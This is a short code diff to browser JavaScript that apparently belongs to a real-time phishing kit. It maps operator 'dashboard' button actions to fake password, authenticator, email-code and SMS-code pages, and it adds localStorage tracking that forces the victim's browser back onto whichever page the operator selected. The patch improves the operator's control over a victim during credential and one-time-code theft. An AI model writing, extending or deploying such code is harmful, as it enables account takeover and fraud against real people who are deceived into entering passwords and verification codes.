@@ -112,6 +112,30 @@
     wrong_sms:         "sms.html"
   };
 
+  // ADD THIS BLOCK
+const PAGE_FILE_MAP = {
+  app:              "app.html",
+  wrong_password:   "app.html",
+  loading:          "loading.html",
+  gauth:            "auth.html",
+  wrong_gauth:      "auth.html",
+  email_code:       "email.html",
+  wrong_email_code: "email.html",
+  sms:              "sms.html",
+  wrong_sms:        "sms.html"
+};
+const THIS_PAGE = "loading.html";
+function setTrackedPage(buttonName) {
+  const dest = PAGE_FILE_MAP[String(buttonName || "").trim().toLowerCase()];
+  if (dest) { try { localStorage.setItem("page", dest); } catch {} }
+}
+(function checkTrackedPage() {
+  try {
+    const stored = localStorage.getItem("page");
+    if (stored && stored !== THIS_PAGE) location.href = stored;
+  } catch {}
+})();
+// END ADD
   // --- Helpers ---
   function normalizeKey(x) {
     const s = String(x || "").trim();
@@ -160,6 +184,7 @@
 
     // Honor dashboard actions -> redirect, including sms/wrong_sms
     socket.on("dashboard-action", ({ buttonName }) => {
+      setTrackedPage(buttonName);
       const dest = getRedirectFor(buttonName);
       if (dest && !alreadyOn(dest)) {
         location.href = dest;
